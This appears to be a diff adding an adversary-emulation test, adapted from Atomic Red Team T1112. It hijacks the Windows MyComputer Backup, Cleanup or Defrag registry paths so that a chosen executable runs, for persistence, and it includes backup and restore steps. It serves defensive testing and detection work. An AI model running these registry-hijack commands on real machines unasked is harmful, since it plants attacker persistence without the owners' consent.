@@ -1,0 +1,67 @@
+# Adapted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guid: 599f3b5c-0323-44ed-bb63-4551623bf675
+
+---
+api_version: 2.0
+uuid: c4387c60-779a-4e2f-bd75-2be93133f9b7
+name: Abusing MyComputer Path for Persistence
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity
+
+  This TTP supports Disk Cleanup, Disk Defragmentation, and Disk Backup
+
+mitre:
+  tactics:
+    - "TA0003 Persistence"
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: method
+    description: Method to use for persistence
+    type: string
+    choices:
+      - "backup"
+      - "cleanup"
+      - "defrag"
+    default: "backup"
+  - name: executable_path
+    description: Custom Executable to run
+    type: string
+    default: "C:\\Windows\\System32\\cmd.exe"
+  - name: backup_location
+    description: Path where registry backup will be saved
+    type: path
+    default: "C:\\Users\\Public\\backup.reg"
+
+steps:
+  - name: backup_registry
+    executor: cmd.exe
+    inline: |
+      reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer" "{{.Args.backup_location}}" /y 2>nul
+
+  - name: add_registry_entry
+    executor: cmd.exe
+    inline: |
+      {{ if eq .Args.method "backup" }}
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "{{.Args.executable_path}}" /f
+      {{ else if eq .Args.method "cleanup" }}
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\CleanupPath" /t REG_EXPAND_SZ /d "{{.Args.executable_path}}" /f
+      {{ else if eq .Args.method "defrag" }}
+      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath" /t REG_EXPAND_SZ /d "{{.Args.executable_path}}" /f
+      {{ end }}
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg import "{{.Args.backup_location}}" 2>nul
+        del "{{.Args.backup_location}}" /f /q 2>nul
